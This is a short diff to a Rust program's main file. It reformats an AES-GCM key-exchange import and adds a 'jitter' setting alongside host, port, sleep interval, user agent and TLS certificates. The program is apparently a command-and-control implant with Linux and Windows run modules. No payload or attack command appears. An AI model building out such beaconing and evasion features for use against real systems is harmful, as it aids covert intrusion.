@@ -11,7 +11,10 @@ use core::run_linux::run;
 use core::run_windows::run;
 
 use config::config::Config;
-use crypto::aesgcm::{AES_GCM_KEY_LENGTH, decode, derive_shared_secret, generate_keypair, vec_u8_to_u8_32};
+use crypto::aesgcm::{
+    AES_GCM_KEY_LENGTH,
+    decode, derive_shared_secret, generate_keypair, vec_u8_to_u8_32
+};
 
 include!(concat!(env!("OUT_DIR"), "/init.rs"));
 
@@ -22,6 +25,7 @@ async fn main() {
         host,
         port,
         sleep,
+        jitter,
         user_agent,
         https_root_cert,
         https_client_cert,
@@ -40,6 +44,7 @@ async fn main() {
         proto.to_string(),
         host.to_string(),
         port,
+        jitter,
         sleep,
         user_agent.to_string(),
         https_root_cert.to_string(),
